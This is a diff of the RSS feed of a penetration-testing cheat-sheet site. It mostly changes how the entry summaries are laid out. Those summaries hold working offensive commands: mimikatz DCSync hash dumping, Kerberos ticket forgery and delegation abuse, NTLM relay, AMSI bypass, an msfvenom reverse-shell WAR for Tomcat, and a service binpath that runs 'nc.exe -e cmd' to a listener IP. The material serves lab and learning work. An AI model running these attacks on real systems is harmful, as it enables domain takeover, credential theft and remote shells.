@@ -12,42 +12,49 @@
       <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
-      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
+      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
     </item>
     <item>
       <title>Account Operators</title>
       <link>https://tldrbins.github.io/account_operators/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/account_operators/</guid>
-      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString &amp;lt;NEW_USER_PASSWORD&amp;gt; -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser &amp;lt;NEW_USER&amp;gt; -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.</description>
+      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString &amp;lt;NEW_USER_PASSWORD&amp;gt; -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser &amp;lt;NEW_USER&amp;gt; -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.</description>
     </item>
     <item>
       <title>AD Recycle Bin</title>
       <link>https://tldrbins.github.io/ad_recycle_bin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
-      <description> Privesc #1: Restore deleted AD account 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;#34;&amp;lt;DELETED_USER&amp;gt;&amp;#34; } -includeDeletedObjects -property * 4. Restore deleted account # Rename the target account to avoid user exist error Restore-ADObject -Identity &amp;lt;ObjectGUID&amp;gt; -NewName &amp;lt;NEW_USER&amp;gt; -TargetPath &amp;#34;CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; </description>
+      <description> Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;#34;&amp;lt;DELETED_USER&amp;gt;&amp;#34; } -includeDeletedObjects -property * 4. Restore deleted account # Rename the target account to avoid user exist error Restore-ADObject -Identity &amp;lt;ObjectGUID&amp;gt; -NewName &amp;lt;NEW_USER&amp;gt; -TargetPath &amp;#34;CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; </description>
     </item>
     <item>
       <title>ADCS</title>
       <link>https://tldrbins.github.io/adcs/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/adcs/</guid>
-      <description>Enum (From Linux) certipy-ad certipy-ad find -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M adcs Enum (From Windows) Powershell # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates Certify.exe # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser ADCSTemplate ADCSTemplate&#xA;import-module .</description>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser import-module .\ADCSTemplate.psm1 get-adcstemplate | fl displayname Ref: ADCSTemplate</description>
     </item>
     <item>
       <title>AddKeyCredentialLink</title>
       <link>https://tldrbins.github.io/addkeycredentiallink/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
-      <description>Privesc #1: Shadow credentials (From Linux) pywhisker&#xA;0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools&#xA;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; python3 gettgtpkinit.</description>
+      <description>Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; python3 gettgtpkinit.py -cert-pfx &amp;lt;PFX_FILE&amp;gt; -pfx-pass &amp;lt;PFX_PASSWORD&amp;gt; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt; &amp;lt;USERNAME&amp;gt;.</description>
     </item>
     <item>
       <title>AddSelf</title>
       <link>https://tldrbins.github.io/addself/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/addself/</guid>
-      <description>Privesc #1: Add self to group (From Linux) powerview.py powerview.py&#xA;# Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
+      <description>Privesc #1: Add self to group (From Linux) powerview.py bloodyAD # Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; Ref: powerview.py&#xA;# Add self to group python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
+    </item>
+    <item>
+      <title>Advance curl</title>
+      <link>https://tldrbins.github.io/advance_curl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_curl/</guid>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # PUT a file curl -X PUT http://example.com/example.txt -d @example.txt # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@example.com/example.txt -d @example.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://example.com/example.txt --data-binary @example.</description>
     </item>
     <item>
       <title>Advance wget</title>
@@ -61,21 +68,21 @@
       <link>https://tldrbins.github.io/allowedtodelegate/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
-      <description>Privesc #1: Forge a Ticket (From Linux) # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn www/dc.example.com -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work</description>
+      <description>Privesc #1: Forge a Ticket Linux Windows # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn www/dc.example.com -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work&#xA;TO-DO</description>
     </item>
     <item>
       <title>Alternate Data Stream</title>
       <link>https://tldrbins.github.io/alternate_data_stream/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/alternate_data_stream/</guid>
-      <description> Show ADS # cmd cmd /C dir /R \Windows\Tasks\example.txt # powershell Get-Item -Path \Windows\Tasks\example.txt -force -stream * </description>
+      <description> Show ADS Windows # cmd cmd /C dir /R \Windows\Tasks\example.txt # powershell Get-Item -Path \Windows\Tasks\example.txt -force -stream * </description>
     </item>
     <item>
       <title>Android</title>
       <link>https://tldrbins.github.io/android/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/android/</guid>
-      <description>Unpack .apk file apktool&#xA;# Get .smali files java -jar apktool_2.9.3.jar d app.apk jadx&#xA;# Get .java files jadx app.apk Re-pack .apk file 1. Initial pack java -jar apktool_2.9.3.jar b --use-aapt2 app -o app_repacked.apk 2. zip align zipalign&#xA;3. Sign the apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:&amp;lt;PASSWORD&amp;gt; --out app_final.apk app_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.</description>
+      <description>Unpack .apk file # Get .smali files java -jar apktool_2.9.3.jar d app.apk # Get .java files jadx app.apk Ref: apktool Ref: jadx&#xA;Re-pack .apk file 1. Initial pack java -jar apktool_2.9.3.jar b --use-aapt2 app -o app_repacked.apk 2. zip align zipalign&#xA;3. Sign the apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:&amp;lt;PASSWORD&amp;gt; --out app_final.apk app_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.</description>
     </item>
     <item>
       <title>Apache</title>
@@ -89,7 +96,7 @@
       <link>https://tldrbins.github.io/apache_tomcat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
-      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp 1337 3a. Via Manager GUI +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -&amp;gt; Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ 3b. Via Manager Script curl -u &amp;#39;&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; http://example.</description>
+      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp 1337 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -&amp;gt; Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ curl -u &amp;#39;&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; http://example.</description>
     </item>
     <item>
       <title>Apt</title>
@@ -103,49 +110,49 @@
       <link>https://tldrbins.github.io/aws/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/aws/</guid>
-      <description>Setup # Install awscli sudo apt install awscli # Set config aws configure AWS Access Key ID [None]: test AWS Secret Access Key [None]: test Default region name [None]: test Default output format [None]: Default AWS Credential Location ~/.aws/credentials S3 # List buckets aws s3 --endpoint-url http://s3.example.com ls # List bucket aws s3 --endpoint-url http://s3.example.com ls s3://&amp;lt;BUCKET_NAME&amp;gt; # Upload to bucket aws s3 --endpoint-url http://s3.example.com cp &amp;lt;FILE&amp;gt; s3://&amp;lt;BUCKET_NAME&amp;gt;/&amp;lt;FILE&amp;gt; dynamodb # List tables aws --endpoint-url http://s3.</description>
+      <description>Setup # Install awscli sudo apt install awscli # Set config aws configure AWS Access Key ID [None]: test AWS Secret Access Key [None]: test Default region name [None]: test Default output format [None]: Default AWS Credential Location ~/.aws/credentials AWS Services S3 dynamodb lambda # List buckets aws s3 --endpoint-url http://s3.example.com ls # List bucket aws s3 --endpoint-url http://s3.example.com ls s3://&amp;lt;BUCKET_NAME&amp;gt; # Upload to bucket aws s3 --endpoint-url http://s3.example.com cp &amp;lt;FILE&amp;gt; s3://&amp;lt;BUCKET_NAME&amp;gt;/&amp;lt;FILE&amp;gt; # List tables aws --endpoint-url http://s3.</description>
     </item>
     <item>
       <title>Bloodhound</title>
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description>sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound-python # With Creds bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip bloodhound with PKI support BloodHound&#xA;# Fix: GPU process isn&amp;#39;t usable. Goodbye.</description>
+      <description>Info Collection (From Linux) bloodhound-python # With Creds bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\ProgramData Ref: sharphound.</description>
     </item>
     <item>
       <title>Built-in Group</title>
       <link>https://tldrbins.github.io/built-in_group/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/built-in_group/</guid>
-      <description> Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.10 443&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
+      <description> Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 Windows # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.10 443&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
     </item>
     <item>
       <title>Bypass ASMI</title>
-      <link>https://tldrbins.github.io/bypas_asmi/</link>
+      <link>https://tldrbins.github.io/bypass_asmi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/bypas_asmi/</guid>
-      <description>Payloads Amsi-Bypass-Payloads&#xA;evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
+      <guid>https://tldrbins.github.io/bypass_asmi/</guid>
+      <description>evil-winrm payloads menu Bypass-4MSI Note: have to run menu first&#xA;Amsi-Bypass-Payloads</description>
     </item>
     <item>
       <title>Compressed Files</title>
       <link>https://tldrbins.github.io/compressed_files/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/compressed_files/</guid>
-      <description>Hint: Always put the zip file inside a new folder before unzip&#xA;zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # zip a symlink (not the destination file) zip --symlinks file.zip symlink # List files without unzip unzip -l file.zip # unzip unzip file.zip # unzip (Windows) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;C:\ProgramData\file.zip&amp;#39;, &amp;#39;C:\ProgramData\&amp;#39;) tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.</description>
+      <description>Hint: Always put the zip file inside a new folder before unzip&#xA;zip tar.gz tar gz rar 7z bz # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # zip a symlink (not the destination file) zip --symlinks file.zip symlink # List files without unzip unzip -l file.zip # unzip unzip file.zip # unzip (Windows) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;C:\ProgramData\file.zip&amp;#39;, &amp;#39;C:\ProgramData\&amp;#39;) # Compress a file tar -cvzf file.</description>
     </item>
     <item>
       <title>Connection from Public Internet</title>
       <link>https://tldrbins.github.io/connection_from_public_internet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
-      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net ngrok # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
       <title>Constrained Delegation</title>
       <link>https://tldrbins.github.io/constrained_delegation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/constrained_delegation/</guid>
-      <description>Abuse #1: RBCD Attack 1. Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 2. RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
+      <description>Abuse #1: RBCD Attack Linux 1. Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 2. RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
     </item>
     <item>
       <title>CouchDB</title>
@@ -166,35 +173,21 @@
       <link>https://tldrbins.github.io/cron/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/cron/</guid>
-      <description> Check Cron Jobs ls -la /etc/cron.d/ cat /etc/crontab crontab -l Check background processes Downlaod pspy&#xA;./pspy </description>
+      <description>Linux Check Cron Jobs ls -la /etc/cron.d/ cat /etc/crontab crontab -l Check background processes ./pspy Ref: pspy</description>
     </item>
     <item>
       <title>Cross Session Relay</title>
       <link>https://tldrbins.github.io/cross_session_relay/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/cross_session_relay/</guid>
-      <description> Display information about the session host qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 RemotePotato0&#xA;# In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x 10.10.14.10 -p 9999 KrbRelay KrbRelay&#xA;.\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&amp;#34; </description>
-    </item>
-    <item>
-      <title>Curl</title>
-      <link>https://tldrbins.github.io/advance_curl/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/advance_curl/</guid>
